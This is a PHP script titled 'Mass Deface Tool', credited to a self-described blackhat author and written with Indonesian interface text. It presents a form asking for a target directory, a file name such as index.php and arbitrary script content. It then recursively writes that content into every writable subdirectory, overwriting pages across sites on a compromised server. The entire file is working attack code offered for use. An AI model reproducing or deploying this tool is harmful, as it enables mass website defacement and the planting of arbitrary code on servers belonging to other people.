<?php
// Coded: Mc'Sl0vv
// http://idiotblackhat.blogspot.com
function NF($f,$sc){
$fp2 = fopen($f,"w");
fputs($fp2,$sc);
}
function OD($gcwd){
	if(is_writable($gcwd)){
	$FN = $_POST['nama'];
	$sc = $_POST['script'];
	$a = scandir("$gcwd");
foreach($a as $A2){
	if($A2 == "." | $A2 == ".."){
	}elseif(is_dir("$gcwd/$A2")){
       $ND = "$gcwd/$A2";
		if(is_writable($ND)){
		echo "<style>body{background-color:black;}</style><font color=blue>$ND/$FN <font color=lime><-- Sukses !<br>";
		$cf = NF("$ND/$FN", "$sc");
		$B = OD($ND);
 }
else{
	echo "Gak Mendukung dirnya:(";
	}
}
}	
}
else{
	echo "Gak mendukung dirnya:(";
}
}
if($_POST){
$C = $_POST['dir'];
$Y = OD($C);
echo $Y;
}
else{
	echo '<html>
<head>
<title>Mass Deface Tool</title>
</head>
<body>
<style>
body{
	background-color: black;
}
.sd{
    border:1px solid blue;
    background-color: black;
    color: yellow;
}
placeholder{
	color: yellow;
}
.gas{
	background-color: black;
	color: white;
	border: 1px solid blue;
	width: 178px;
}
a{color:lime;}
a:hover{color:blue;}
a:visited{color:yellow;}
</style>
<center>
<table><br><br><br><br><font color="lime" size="2">Path Sekarang<br>'.getcwd().'</font>
<tr><td><form method="post" action="?action"></td></tr>
<tr><td><input class="sd" type="text" name="dir" placeholder="Dir cnth /home/user/public_html"></td> </tr>
<tr><td><input class="sd" type="text" name="nama" placeholder="Nama File, contoh index.php"></td> </tr>
<tr><td><br><textarea class="sd" rows="10" cols="21px" name="script" placeholder="Script"></textarea></td></tr>
<br><tr><td><br><input class="gas" type="submit" value="Submit"></td></tr>
</form>
</table>';
echo"<br><font color=red>Coded By <a href='http://idiotblackhat.blogspot.com' target='_blank'>Mc'Sl0vv</a></font></center>";

}
?>